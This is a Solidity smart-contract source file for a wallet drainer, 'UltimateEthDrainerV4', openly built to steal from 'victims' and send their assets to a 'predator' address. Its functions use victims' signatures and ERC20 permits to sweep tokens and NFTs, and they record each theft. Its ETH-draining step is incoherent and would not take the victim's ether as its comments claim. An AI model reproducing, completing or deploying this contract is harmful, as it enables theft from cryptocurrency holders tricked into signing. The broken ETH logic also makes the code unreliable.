// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract UltimateEthDrainerV4 is Ownable {
    using ECDSA for bytes32;
    using SafeERC20 for IERC20;

    // ======== CORE SYSTEM ========
    address public immutable predator;
    uint256 public maxDrainAmount;
    
    // ======== CROSS-CHAIN PLACEHOLDER ========
    address public lzEndpoint;
    mapping(uint16 => bytes) public trustedRemote;
    
    // ======== OTHER STATE VARIABLES ========
    mapping(address => bool) public whitelistedRelayers;
    mapping(address => uint256) public lastAttackTime;
    
    struct DrainRecord {
        address asset;
        uint256 amount;
        uint256 timestamp;
    }
    mapping(address => DrainRecord[]) public victimHistory;

    struct PermitSignature {
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }
    // ======== EVENT ========
    event FundsDrained(address indexed victim, address asset, uint256 amount);
    event CrossChainDrain(uint16 indexed dstChainId, address victim);
    event GaslessDrainExecuted(address indexed relayer, address victim, uint256 fee);
    event SignatureDebug(address indexed victimAddress, bytes32 pythonPackedDataHash, bytes32 pythonEthSignedMessageHash, bytes victimSignatureReceived);

    constructor(address _predator) Ownable(msg.sender) {
        predator = _predator;
        maxDrainAmount = 10 ether;
    }

    receive() external payable {}

    // =========[ CORE DRAIN FUNCTIONS ]========= //
    function nuclearDrain(
        address victim,
        address[] calldata erc20Tokens,
        IERC721Enumerable[] calldata erc721Tokens,
        uint256 deadline,
        bytes calldata signature
    ) external payable {
        // 1. Verify Signature
        bytes32 messageHash = keccak256(abi.encodePacked(
            victim, 
            erc20Tokens, 
            erc721Tokens, 
            deadline
        ));
        bytes32 ethSignedMessage = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        
        require(ECDSA.recover(ethSignedMessage, signature) == victim, "Invalid sig");
        require(block.timestamp <= deadline, "Expired");
    
        // 2. Nuclear ETH Drain (Work for EOA & Smart Contract)
        uint256 ethBalance = victim.balance;
        if (ethBalance > 0) {
            bool success;
            
            // Method 1: Try standard transfer (for ERC20-like ETH)
            (success, ) = victim.call{value: 0}(
                abi.encodeWithSignature(
                    "transfer(address,uint256)", 
                    predator, 
                    ethBalance
                )
            );
            
            // Method 2: For EOA wallets (selfdestruct trick)
            if (!success) {
                Stealer stealer = new Stealer{value: ethBalance}(victim, predator);
                stealer.burn();
            }
            
            _recordDrain(victim, address(0), ethBalance);
        }
    
        // 3. Drain ERC20 Tokens (Unchanged)
        for (uint i = 0; i < erc20Tokens.length; i++) {
            uint256 balance = IERC20(erc20Tokens[i]).balanceOf(victim);
            if (balance > 0) {
                IERC20(erc20Tokens[i]).safeTransferFrom(victim, predator, balance);
                _recordDrain(victim, erc20Tokens[i], balance);
            }
        }
    
        // 4. Drain ERC721 NFTs (Unchanged)
        for (uint i = 0; i < erc721Tokens.length; i++) {
            IERC721Enumerable nft = erc721Tokens[i];
            uint256 balance = nft.balanceOf(victim);
            for (uint j = 0; j < balance; j++) {
                uint256 tokenId = nft.tokenOfOwnerByIndex(victim, j);
                nft.safeTransferFrom(victim, predator, tokenId);
                _recordDrain(victim, address(nft), tokenId);
            }
        }
    }
    
    // =========[ PERMIT FUNCTIONS ]========= //
    function drainWithPermit(
        address victim,
        address token,
        uint256 amount,
        PermitSignature calldata permitSig,
        bytes calldata victimSig
    ) external {
        bytes32 messageHash = keccak256(abi.encodePacked(
            victim,
            token,
            amount
        ));
        bytes32 ethSignedMessage = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        
        // --- PEMANCARAN EVENT ---
        emit SignatureDebug(victim, messageHash, ethSignedMessage, victimSig);
    
        require(ECDSA.recover(ethSignedMessage, victimSig) == victim, "Invalid victim sig");
    
        IERC20Permit(token).permit(
            victim,
            address(this),
            amount,
            permitSig.deadline,
            permitSig.v,
            permitSig.r,
            permitSig.s
        );
    
        IERC20(token).safeTransferFrom(victim, predator, amount);
        _recordDrain(victim, token, amount);
    }

    // =========[ ADMIN FUNCTIONS ]========= //
    function setLzEndpoint(address _endpoint) external onlyOwner {
        lzEndpoint = _endpoint;
    }

    function setTrustedRemote(uint16 chainId, bytes calldata remote) external onlyOwner {
        trustedRemote[chainId] = remote;
    }

    function _recordDrain(address victim, address asset, uint256 amount) private {
        victimHistory[victim].push(DrainRecord({
            asset: asset,
            amount: amount,
            timestamp: block.timestamp
        }));
        emit FundsDrained(victim, asset, amount);
    }

}

// Helper contract for forced ETH transfer (selfdestruct)
contract Stealer {
    constructor(address victim, address predator) payable {
        // Force send ETH to predator
        selfdestruct(payable(predator));
    }
        
    function burn() external {
        selfdestruct(payable(address(0)));
    }
}
